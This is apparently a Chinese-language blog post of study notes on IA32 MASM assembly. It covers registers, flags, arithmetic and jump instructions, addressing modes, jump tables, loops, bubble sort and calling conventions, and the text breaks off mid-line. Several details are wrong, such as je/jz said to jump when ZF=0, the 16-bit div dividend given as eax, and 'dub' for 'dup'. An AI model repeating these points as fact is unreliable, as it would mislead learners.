[{"title":"IA32架构的MASM","url":"/2025/06/02/IA32架构的MASM/","content":"\n# 开发环境\n\n使用**Visual Studio 2017 Community**\n\n![image-20250601144537359](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601144537359.png)\n\n![image-20250601144842836](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601144842836.png)\n\n![image-20250601144907897](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601144907897.png)\n\n![image-20250601144956515](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601144956515.png)\n\n![image-20250601145040078](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601145040078.png)\n\n![image-20250601145136031](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601145136031.png)\n\n## 程序格式\n\n```asm\n.386 ;使用.386指令集\n\n.model flat,stdcall ;flat内存模式\t\t调用子程序使用stdcall\n\ncomment/*\nflat:\n    所有段(代码段、数据段、堆栈段)都使用相同的32位地址空间\n    不需要使用段寄存器(CS, DS, SS等)，所有内存访问都使用32位偏移地址\nstdcall:\n\t参数从右向左压入堆栈\n\t被调用函数负责清理堆栈(与cdecl不同，cdecl是调用者清理堆栈)\n*/\n\noption casemap:none ;大小写敏感\n\n.const ;常量区\n\tfm db \"%s\"\n\nARR_LEN = 1 ;也可以这样声明常量\n\n.data ;全局变量区\n    x db 0 ;1bytes\n    y dw 0 ;字;2bytes\n    z dd 0 ;双字;4bytes\n    arr dd 50 dup(0) ;50个连续的值为零的4字节空间\n\n.code\n    main proc ;main程序段\n    _start::\n\n    main endp\n    end _start ;end后的部分就是程序入口，在这里,_start就是程序入口\n```\n\n## 常用寄存器\n\n### EAX\n\n通用寄存器之一，存放函数的返回值\n\n`EBX，ECX，EDX`寄存器布局与此类似\n\n![image-20250601151224193](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250601151224193.png)\n\n### EBX\n\n通用寄存器之一\n\n### ECX\n\n通用寄存器之一，存放循环次数\n\n也用于字符串操作（如 `rep stonsb`）、移位指令（如 shl eax, cl`）\n\n### EDX\n\n通用寄存器之一\n\n### ESI\n\n通用寄存器之一\n\n在字符串/内存操作中默认指向**源数据地址**\n\n### EDI\n\n在字符串/内存操作中默认指向**目标地址**\n\n### ESP\n\n栈顶指针寄存器，存放栈顶的地址\n\nPUSH会先递减 `ESP`，再写入数据；`POP` 会读取数据后递增 `ESP`\n\n### EBP\n\n通常用作**栈帧基址**（函数内通过 `[EBP+offset]` 访问局部变量和参数）\n\n### EIP\n\n程序计数器寄存器，存放下一条指令的地址\n\n## 常用标志位\n\n### CF(Carry Flag)\n\n无符号数溢出标志\n\nadd/sub存在进位/借位时，CF置为1\n\n### ZF(Zero Flag)\n\n运算结果为0时，置为1\n\n### SF(Sign Flag)\n\n运算结果的最高位\t0:正数\t1:负数\n\n### PF(Parity Flag)\n\n结果低8位的 `1` 的个数是否为偶数\n\n0:奇校验\n\n1:偶校验\n\n### OF(Overflow Flag)\n\n有符号数溢出标志\n\n### DF(Direction Flag)\n\n字符串操作方向标志\n\n0:正向\n\n1:反向\n\n```asm\ncld ;重置df为0\n```\n\n## 常用指令\n\n### inc-自增\n\n```asm\n;对全局变量自增\n.data ;全局变量\nx dd 0 ;x=0\n\n.code\nmain proc ;main程序段\n_start::\n\tinc x ;x = 1\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start ;end后的部分就是程序入口，在这里,_start就是程序入口\n\n;------------------------------------------------------\n\n.data ;全局变量\n\n.code\nmain proc ;main程序段\n_start::\n\tmov eax,0 ;eax:0x00000000\n\tinc eax\t  ;eax:0x00000001\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start ;end后的部分就是程序入口，在这里,_start就是程序入口\n```\n\n\n\n### dec-自减\n\n```asm\n;对全局变量自减\n.data ;全局变量\nx dd 1 ;x=1\n\n.code\nmain proc ;main程序段\n_start::\n\tdec x ;x = 0\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start ;end后的部分就是程序入口，在这里,_start就是程序入口\n\n;------------------------------------------------------\n\n.data ;全局变量\n\n.code\nmain proc ;main程序段\n_start::\n\tmov eax,1 ;eax:0x00000001\n\tdec eax\t  ;eax:0x00000000\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start ;end后的部分就是程序入口，在这里,_start就是程序入口\n```\n\n### mov\n\n```assembly\nmov dst,src\n;将立即数传送到寄存器\nmov eax,1\n;将寄存器中的值传送到另一寄存器;注意两个寄存器的大小要一致(8bits->8bits;16bits->16bits;32bits->32bits)\nmov eax,ebx\nmov al,ah\n;mov的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数\nmov [esp+1],[esp+2] ;错误\nmov [esp+1],1 ;错误\nmov x,y ;错误\n```\n\n### movzx-零拓展传送\n\n**高位补零**，无论源操作数的符号位（最高位）是 `0` 还是 `1`，高位全部填充 `0`\n\n```asm\n.code\nmain proc\n_start::\n\tmov al,2\n\n\tmovzx ax,al ;al拓展到ax\n\n\tmovzx eax,ax ;ax拓展到eax\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n初始的al\n\n![image-20250603182320971](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182320971.png)\n\nmovzx ax,al后（注意ah的变化）\n\n![image-20250603182329581](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182329581.png)\n\nmovzx eax,ax后\n\n![image-20250603182352218](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182352218.png)\n\n### movsx-符号拓展传送\n\n源操作数高位是1就补1,高位是0就补0\n\n```asm\n.code\nmain proc\n_start::\n\tmov al,-1\n\n\tmovsx ax,al  ;al拓展到ax\n\n\tmovsx eax,ax ;ax拓展到eax\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n初始的al\n\n![image-20250603182637465](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182637465.png)\n\nmovsx ax,al后\n\n![image-20250603182705835](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182705835.png)\n\nmov ax,eax后\n\n![image-20250603182721954](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603182721954.png)\n\n### sub\n\n```asm\nsub dst,src\n\n;寄存器中的值减去立即数\nsub eax,1\n;将寄存器的值减去另一寄存器中的值\nsub eax,ebx\n;将内存中的值减去寄存器中的值\nsub x,ebx\nsub [esi+4],eax\n;sub的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数\nsub [esp+1],[esp+2] ;错误\nsub [esp+1],1 ;错误\nsub x,y ;错误\n```\n\n\n\n### add\n\n```assembly\nadd dst,src\n;将立即数加到寄存器中\nadd eax,1\n;将寄存器的值加到寄存器中\nadd eax,ebx\n;将寄存器中的值加到内存\nadd x,ebx\nadd [esi+4],eax\n;add的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数\nadd [esp+1],[esp+2] ;错误\nadd [esp+1],1 ;错误\nadd x,y ;错误\n```\n\n### adc-带进位的加法\n\n#### cf标志位:\n\n**加法（`ADD/ADC`）**：如果运算结果的最高位产生进位，`CF = 1`，否则 `CF = 0`。\n\n**减法（`SUB/SBB`）**：如果运算需要借位（被减数 < 减数），`CF = 1`，否则 `CF = 0`。\n\n**移位/循环指令（`SHL/SHR/ROL/ROR`等）**：存放被移出的位。\n\n**比较指令（`CMP`）**：同减法，`CMP A, B` 等价于 `SUB A, B`（但不保存结果，只改标志位）\n\n```assembly\nadd sum,ebx\t;sum的前4个字节\nadc sum+4,0 ;给sum的后四个字节加上进位 <-> 相当于sum+4 = sum+4+0+cf\n```\n\n### mul-无符号数乘法\n\n隐含使用 `AL`/`AX`/`EAX` 作为被乘数\n\n```assembly\nmul bl ;结果位于ax\n\nmul bx ;结果:DX:AX (高16:低16)\n\nmul ebx ;结果:EDX:EAX (高32:低32)\n```\n\n### imul-有符号数乘法\n\n#### 单操作数\n\n与`mul`相同\n\n#### 双操作数\n\n```assembly\nIMUL r16, r/m16     ; r16 = r16 * r/m16 r/m:寄存器或内存\nIMUL r32, r/m32     ; r32 = r32 * r/m32\n```\n\n#### 三操作数\n\n```assembly\nimul r32, r/m32, imm32  ; r32 = r/m32 * imm32（32 位乘法）\nimul r16, r/m16, imm16  ; r16 = r/m16 * imm16（16 位乘法）\n```\n\n### div-无符号整数除法\n\n8位:\n\n被除数:ax，商：al，余数ah\n\n16位:\n\n被除数:eax，商：ax，余数dx\n\n32位:\n\n被除数:edx:eax，商：eax，余数edx\n\n### shl左移，shr右移\n\n移位位数放在cl或者立即数\n\n```assembly\nSHL r/m, imm8   ; 左移立即数位\nSHL r/m, CL     ; 左移CL寄存器指定的位数\nSHR r/m, imm8   ; 右移立即数位\nSHR r/m, CL     ; 右移CL寄存器指定的位数\n```\n\n### CBW\n\n将al中8位有符号数扩展到ax中\n\n```asm\nmov al,0\ncbw\n```\n\n\n\n### CWD\n\n将ax中16位有符号数扩展到dx:ax中\n\n```asm\nmov ax,0\ncwd\n```\n\n### lea\n\n取地址并传送\n\n```asm\n.data\n\tarr db 50 dub(0)\n.code\nmain proc\n\tlea esi,arr ;取arr的首地址传送到esi中\nmain endp\nend main\n```\n\n等价于\n\n```asm\n.data\n\tarr db 50 dub(0)\n.code\nmain proc\n\tmov esi,offset arr ;取arr的首地址传送到esi中 offset:通用偏移地址获取\nmain endp\nend main\n```\n\n### 转移指令\n\n#### jmp\n\n无条件转移\n\n转移到标签\n\n```asm\ntest1:\n\tmov eax,offset test1\n\tjmp test1\n```\n\n寄存器间接转移\n\n```asm\ntest1:\n\tmov eax,offset test1\n\tjmp eax ;转移到eax中的地址\n```\n\n#### je/jz\n\n当zf=0时转移\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,1\n\n\tcmp eax,ebx\n\n\tjz test1 ;此时相当于死循环\t写成je也是相同的效果\n\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### ja/jnbe\n\n无符号数比较，高于(不低于等于)时转移(cf=0且zf=0)\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tcmp ebx,eax\n\n\tja test1 ;跳转到test1\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n\n;------------------------\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tcmp eax,ebx\n\n\tja test1\n\tjmp end_if ;跳转到程序结束\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### jb/jnae\n\n无符号数比较,低于(不高于等于)时转移\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tcmp ebx,eax\n\n\tjb test1\n\tjmp end_if ;跳转到程序结束\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n\n;------------------------\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tcmp eax,ebx\n\n\tjb test1 ;跳转到test1\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### jo\n\n溢出转移(OF=1)\n\n```asm\n.data\nc1 dd 07fffffffh ;int_max\n\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tadd eax,c1\n\n\tjo test1\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### jno\n\n不溢出转移(OF=0)\n\n\n\n#### js\n\n为负转移(sf=1)\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tadd eax,c1 ;0xffffffff = -1 为负\n\n\tjs test1 ;转移到test1\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n\n\n#### jns\n\n为正转移(sf=0)\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,1\n\tmov ebx,4\n\n\tadd ebx,c1 ;2=0x00000010\n\n\tjns test1 ;转移到test1\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n\n\n#### jg/jnle\n\n有符号数比较,大于/不小于等于时转移\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,-1\n\tmov ebx,-4\n\n\tcmp eax,ebx\n\n\tjg test1 ;-1 > -4 转移\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### jl/jnge\n\n有符号数比较，小于/不大于等于时转移\n\n```asm\n.code\nmain proc\n_start::\ntest1:\n\tmov eax,-1\n\tmov ebx,-4\n\n\tcmp ebx,eax\n\n\tjl test1 ;-4 < -1 转移\n\tjmp end_if\n\nend_if:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n#### jcxz\n\ncx=0时转移\n\n#### jecxz\n\necx=0时转移\n\n## 寻址方式\n\n### 寄存器寻址\n\n```assembly\nadd eax,ebx\n```\n\n### 基址寻址\n\n常用于堆栈\n\n```assembly\npush ebp\nmov ebp,esp\nmov eax,[ebp+4] ;基址寻址\n```\n\n### 立即数寻址\n\n```assembly\nmov eax,064h ;常量操作\n```\n\n### 变址寻址\n\n```asm\nmov eax,[esi+10h] ;数组操作\n```\n\n### 相对寻址\n\n```asm\nadc sum+4,0 ;数组操作\n```\n\n### 寄存器间接寻址\n\n**访问指针指向的变量**\n\n```asm\nadd dword ptr [ebx],ecx\n```\n\n# 顺序程序设计\n\neg:有三个长度分别为1、2、4个字节的数据，编写程序求和存放到内存中\n\n## 程序1\n\n三个数据均为无符号数，求和的结果考虑进位的存储\n\n```asm\n.data ;全局变量\na db 1\nb dw 2\nc1 dd 0ffffffffh\t;无符号数\nsum dd 0,0\t;因为要考虑进位存储,需要额外再开4字节空间\n\n.code\nmain proc\n_start::\n\tmovzx ax,a\t;al零拓展到ax\n\n\tadd ax,b\t;b加到ax中\n\t\n\tmovzx eax,ax\t;ax拓展到eax中\n\n\tadd eax,c1\t;发生溢出，CF标志位被置为1\n\n\tmov sum,eax\n\n\tadc sum+4,0\t;进位传送到高4字节 相当于sum+4 = sum+4+0+CF\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n## 程序2\n\n三个数据均为有符号数，求和的结果不考虑进位的存储（进位直接丢掉）\n\n```asm\n.data ;全局变量\na db 1\nb dw 2\nc1 dd 0ffffffffh\t;int：-1 uint:最大值\nsum dd 0\n\n.code\nmain proc\n_start::\n\tmovsx ax,a\t;al零拓展到ax\n\n\tadd ax,b\t;b加到ax中\n\t\n\tmovsx eax,ax\t;ax拓展到eax中\n\n\tadd eax,c1\t;2\n\t\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n## 思考\n\n1.用户如何自定义超过系统事先定义好的数据类型的长度?(比如在C语言中实现128位整数)\n\n***使用连续的等长内存空间来分段存储，根据地址偏移进行分段运算和进位传递***\n\n```c\n_int64 arr[2]; //arr[0]:低64位\tarr[1]:高64位\n_int32 arr[4]; \n```\n\n2.不同寻址方式对编写程序的作用\n\n***作用:不同的寻址方式有不同的程序执行效率，程序可读性与可维护性***\n\n# 简单分支程序设计\n\n汇编中是通过条件/无条件转移指令实现简单的分支程序(if-else结构)\n\n## 程序1\n\n实现逻辑或的逻辑短路\n\n对应的c语言代码\n\n```c\n#include <stdio.h>\nint main()\n{\n        int a=5,b=6,c=7,d=8,m=2,n=2;\n        (m=a<b)||(n=c>d);\n        printf(\"%d\\t%d\",m,n);\n}\n```\n\n\n\n```asm\n.data\n\ta dd 5\n\tb dd 6\n\tc1 dd 7\n\td dd 8\n\tm dd 2\n\tn dd 2\n\n.code\nmain proc\n_start::\n\tmov eax,a\n\n\tcmp eax,b\n\n\tjl alb ;a小于b，exp1 || exp2中的exp1为true，短路\n\n\tmov eax,0\n\tmov m,eax\n\n\tmov eax,c1\n\tcmp eax,d\n\tjle cleb ;给n赋值0\n\n\tmov eax,1\n\tmov n,eax ;给n赋值1\n\tjmp end_proc \n\nalb: ;a小于b，exp1 || exp2中的exp1为true，短路\n\tmov eax,1\n\tmov m,eax\n\tjmp end_proc\ncleb:\n\tmov eax,0\n\tmov n,eax\n\tjmp end_proc\n\t\nend_proc:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n\n\n## 程序2\n\n实现逻辑与的逻辑短路\n\n对应的c语言代码\n\n```c\n#include <stdio.h>\nint main()\n{\n        int a=5,b=6,c=7,d=8,m=2,n=2;\n        (m=a<b)&&(n=c>d);\n        printf(\"%d\\t%d\",m,n);\n}\n```\n\n\n\n```asm\n.data\n\ta dd 5\n\tb dd 6\n\tc1 dd 7\n\td dd 8\n\tm dd 2\n\tn dd 2\n\n.code\nmain proc\n_start::\n\tmov eax,a\n\n\tcmp eax,b\n\n\tjge ageb ;大于等于，第一个表达式为假，短路\n\n\tmov eax,1\n\tmov m,eax\n\n\tmov eax,c1\n\tcmp eax,d\n\tjle cleb ;小于等于，第2个表达式为假\n\n\tmov eax,1\n\tmov n,eax\n\tjmp end_proc \n\nageb:\n\tmov eax,0\n\tmov m,eax ;给m赋值为0\n\tjmp end_proc\ncleb:\n\tmov eax,0\n\tmov n,eax\n\tjmp end_proc\n\t\nend_proc:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n## 思考\n\n1.简述分支语句的实现原理（注意标志位在其中的作用）\n\n根据标志位值的变化和相应的跳转指令\n\n2.简述逻辑运算短路的特征\n\n逻辑或: `exp1 || exp2`\n\n当`exp1`结果为真时，整体就为真，不再执行`exp2`就直接跳转到对应分支\n\n逻辑与 `exp1 && exp2`\n\n当`exp1`结果为假时，整体就为假，不再执行`exp2`就直接跳转到对应分支\n\n# 地址表分支程序设计\n\n在简单分支程序中，有太多的标签与各种各样的跳转指令，分支的不可预测性强，这样会破坏流水线技术\n\n![img](https://bkimg.cdn.bcebos.com/pic/4034970a304e251f7a0a156aa386c9177e3e53a7?x-bce-process=image/format,f_auto/watermark,image_d2F0ZXIvYmFpa2UyNzI,g_7,xp_5,yp_5,P_20/resize,m_lfit,limit_1,h_1080)\n\n但是在地址表分支程序中，所有分支的地址都位于一个地址表中，其实只需要根据间接寻址，使用一条`jmp指令`就能转移到对应分支\n\n原C程序\n\n```c\n#include <stdio.h>\nint main()\n{\n        int grade = 90;\n        switch (grade / 10)\n        {\n        case 9:\n                printf(\"excellence\");\n                break;\n        case 8:\n                printf(\"good\");\n                break;\n        case 7:\n                printf(\"average\");\n                break;\n        case 6:\n                printf(\"pass\");\n                break;\n        default:\n                printf(\"fail\");\n        }\n        return 0;\n}\n```\n\n汇编实现\n\n```asm\n.data\n\tgrade dd 90\n\tadr_table dd offset case6,offset case7,offset case8,offset case9\n\n.code\nmain proc\n_start::\n\txor edx,edx\n\n\tmov eax,grade\n\tmov bx,10\n\tdiv bx\n\n\tsub eax,6 ;获取和6的差值,即后面的偏移量\n\n\tcmp eax,0\n\tjl default ;低于60\n\n\tmov eax,[adr_table+eax*4] ;根据偏移量找到对应分支的地址，解引用后传送到eax中\n\tjmp eax ;转移到对应分支\n\ncase6::\n\tmov eax,6\ncase7::\n\tmov eax,7\ncase8::\n\tmov eax,8\ncase9::\n\tmov eax,9\ndefault:\n\nend_proc:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n## 思考\n\n1.采用地址表和不采用地址表有什么区别\n\n地址表是一种空间换时间的算法，时间复杂度为O(1)，但是空间复杂度达到了O(n)\n\n通过连续内存来存储分支的地址，减少了程序中各种转移指令的使用，不仅使程序可读性更强，同时分支可预测，在分支之间转移的时间少，利于流水线模式\n\n区别:\n\n采用地址表:程序可读性更强，直接使用地址偏移量跳转，更加高效;但是空间开销较高，比较适合条件连续的分支\n\n不采用地址表:程序可读性没那么好，容易逻辑混乱。但是空间开销较小\n\n2.如果分支常量值不连续，还可以使用地址表吗\n\n可以，没有值的地方填充0或者指定值(空间换时间)\n\n# 循环程序设计\n\neg:\n\n编写程序实现C语言函数`void *memset(void* s,int ch,size_t n)`，将指定的内存中连续N个字节填写成指定的内容，要求：\n\n1) 每次填写一个字节\n\n2) 每次填写一个字\n\n3) 分别用LOOP指令、串操作指令、条件（无条件）转移指令分别实现以上的操作\n\n## loop指令实现\n\n循环次数由ecx寄存器决定\n\n1.每次填写一个字节\n\n定义数据\n\n```asm\nfill_var = 03ch ;将填充值定义为常量\n.data\n\tarr db 10 dup(0) ;n dup(x) 给连续n个空间赋值x\n    arr_len dd $-arr ;$表示当前地址,$-arr表示填充的字节数有多少\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov al,fill_var ;一次写入一个字节，填充值传送到al中\n\tmov ecx,arr_len ;循环次数传送到ecx中\n\tlea esi,arr ;取arr的首地址传送到esi中\nmemset:\n\tmov [esi],al ;将填充值传送到esi指向的地址,完成一字节的填充\n\tinc esi ;指针向后移一个字节\n\tloop memset ;循环\n\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n2.每次填写一个字\n\n定义数据\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr dw 10 dup(0) ;字数组\n\tarr_len dd ($-arr)/2 ;填充字数\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov ax,fill_var\n\tmov ecx,arr_len\n\tlea esi,arr\nmemset:\n\tmov [esi],ax\n\tadd esi,2 ;因为一次写入一个字（2个字节），这里地址要加2\n\tloop memset\n\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n\n\n## 串操作指令实现\n\n需要配合rep来实现对一块连续内存进行串填充，填充次数存放在ecx寄存器中\n\n字符串操作方向由df标志位实现(正向:df=0\t反向:df=1)\n\n`rep stosb/stosw`之前应使用`cld`指令先重置df\n\n### stosb\n\n将al中的值写入[edi]中，即一次写入一个字节\n\n定义数据\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr db 10 dup(0) ;字节数组\n\tarr_len dd ($-arr) ;填充字节数\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov al,fill_var\n\tmov ecx,arr_len ;重复次数\n\tlea edi,arr ;操作的首地址一定要放在edi中\n\n\tcld ;清空df位\n\trep stosb\n\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n### stosw\n\n将ax中的值写入[edi]中，即一次写入一个字(2字节)\n\n定义数据\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr dw 10 dup(0) ;字数组\n\tarr_len dd ($-arr)/2 ;填充字数\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov ax,fill_var\n\tmov ecx,arr_len\n\tlea edi,arr\n\n\tcld\n\trep stosw\n\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n\n\n## 条件/无条件转移指令实现\n\n类似与C语言中的\n\n```c\nfor(int i = len;i>=0;--i){\n    /*code*/\n}\n```\n\n一次写入一个字节\n\n定义数据\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr db 10 dup(0) ;字节数组\n\tarr_len dd ($-arr) ;填充字节数\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov al,fill_var\n\tmov ecx,arr_len\n\tlea esi,arr\n\nmemset:\n\tcmp ecx,0\n\tjle end_loop\n\n\tdec ecx\n\n\tmov [esi],al\n\tinc esi\n\n\tjmp memset\n\nend_loop:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n一次写入一个字\n\n定义数据\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr dw 10 dup(0) ;字数组\n\tarr_len dd ($-arr)/2 ;填充字数\n```\n\n实现\n\n```asm\n.code\nmain proc\n_start::\n\tmov ax,fill_var\n\tmov ecx,arr_len\n\tlea esi,arr\n\nmemset:\n\tcmp ecx,0\n\tjle end_loop\n\n\tdec ecx\n\n\tmov [esi],al\n\tadd esi,2\n\n\tjmp memset\n\nend_loop:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n## 实现冒泡排序\n\nC语言实现:\n\n```c\nint k = n - 1;\nfor (int i = 0; i < n; ++i)\n{\n    for (int j = 0; j < k; ++j)\n    {\n        if (arr[j] > arr[j + 1])\n        {\n            int tmp = arr[j];\n            arr[j] = arr[j + 1];\n            arr[j + 1] = tmp;\n        }\n    }\n    k--;\n}\n```\n\n关键点:\n\n内外两层循环，内循环次数比外循环少一次\n\n内循环中有一个临时变量用于交换值\n\n汇编实现\n\n```asm\nfill_var = 03ch ;填充值\n.data\n\tarr db 10,9,8,7,6,5,4,3,2,1 ;字节数组\n\tarr_len dd ($-arr) ;填充字节数\n\n.code\nmain proc\n_start::\n\tlea esi,arr\n\n\tmov ecx,arr_len\n\nouter:\n\tcmp ecx,0\n\tjbe end_loop\n\n\n\tpush ecx ;内循环也需要ecx作为循环次数,因此需要压入堆栈保护起来\n\tpush esi ;esi指向首地址，但是内循环中需要esi向后移动，为了防止找不到首地址，也需要将esi压入堆栈保护\ninner:\n\tmov bl,[esi] ;用寄存器模拟临时变量\n\tmov dl,[esi+1] ;用寄存器模拟临时变量\n\n\tcmp bl,dl ;if (arr[j] > arr[j + 1])\n\tja swap\n\tjmp no_swap\nswap:\n\tmov [esi],dl\n\tmov [esi+1],bl\n\t\nno_swap:\n\tinc esi ;指向下一字节\n\tloop inner\n\n\tpop esi\n\tpop ecx ;平衡堆栈\n\tloop outer\nend_loop:\n\txor eax,eax\n\tret\nmain endp\nend _start\n```\n\n初始数组:\n\n![image-20250604171439997](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250604171439997.png)\n\n排序后:\n\n![image-20250604171459827](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250604171459827.png)\n\n## 思考\n\nloop指令和串操作指令的性能对比，必须通过循环实现的程序如何提高性能?\n\n​\t使用串操作指令的性能优于loop指令\n\n​\t提高性能:\n\n​\t\t1.使用更宽的数据进行操作，减少循环次数\n\n​\t\t2.确保内存对齐\n\n​\t\t3.避免使用loop，使用更高效的指令(比如串操作指令)\n\n\n\n循环程序和分支程序的关系?\n\n​\t循环程序和分支程序都依赖于条件判断和跳转指令，不同的是，循环程序是反复多次跳转，而分支程序跳转后变不再反复跳转回来\n\n\n\nLOOP的双重循环例子，理解系统如何存储临时变量?\n\n​\t将ecx压入堆栈中进行保护，防止内层循环改变ecx的值导致外层循环的结果错误\n\n\n\n高级语言中break和continue的实现?\n\n​\tcontinue:跳转到当前循环的标签\n\n​\tbreak:跳转到循环外的另一个标签\n\n# 子程序设计\n\n## 格式\n\n```asm\n子程序名 proc\n\tpush ebp ;栈帧基址\n\tmov ebp,esp\n\t\n\tpop ebp ;平衡堆栈\n\tret\n子程序名 endp\n```\n\n## 调用\n\n```asm\ncall 子程序名\nadd esp,8 ;例子\n```\n\n`call`指令会将下一条指令(在这里就是`add esp,8`)的地址压入堆栈中(称为返回地址，子程序ret后就会返回到这个位置)，进入子程序后，堆栈内部情况如下\n\n![image-20250604181127014](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250604181127014.png)\n\n## 重点\n\n能判断出堆栈的状态，可以用excel画当前堆栈示意图\n\n## 调用约定\n\n### stdcall\n\n参数从右至左压入堆栈，子程序(被调函数)负责平衡堆栈\n\n```c\nint addxy(int x,int y);\n```\n\n在汇编中传入参数\n\n```asm\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,[ebp+8]\n\tadd eax,[ebp+12]\n\n\tpop ebp\n\tret 8\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tpush y ;先压y\n\tpush x ;再压x\n\n\tcall addxy\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n\n\n### cdecl\n\n参数从右至左压入堆栈，调用者负责平衡堆栈\n\n```asm\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,[ebp+8]\n\tadd eax,[ebp+12]\n\n\tpop ebp\n\tret\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tpush y ;先压y\n\tpush x ;再压x\n\n\tcall addxy\n\t\n\tadd esp,8 ;平衡堆栈\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n### fastcall\n\n前两个参数用 `ECX`/`EDX`，子程序(被调函数)负责平衡堆栈\n\n## 例题\n\neg:编写汇编语言子程序，实现C表达式SUM=X+Y的功能\n\n1) 函数的参数传递采用寄存器实现\n\n```asm\n.data\n\tx1 dd 5\n\ty1 dd 6\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tadd eax,ebx\n\n\tpop ebp\n\tret\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,x1\n\tmov ebx,y1\n\n\tcall addxy\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n2) 函数的参数传递采用堆栈实现，要求函数的形式为int addxy(int ,int)[传值调用]\n\nC语言函数声明\n\n```c\nint addxy(int x,int y);\n```\n\n汇编实现\n\n压栈顺序为 y -> x\n\n堆栈示意图\n\n![image-20250605141425030](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605141425030.png)\n\n```asm\n.data\n\tx1 dd 5\n\ty1 dd 6\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,[ebp+8]\n\tadd eax,[ebp+12]\n\n\tpop ebp\n\tret 8\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tpush y1\n\tpush x1\n\n\tcall addxy\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend 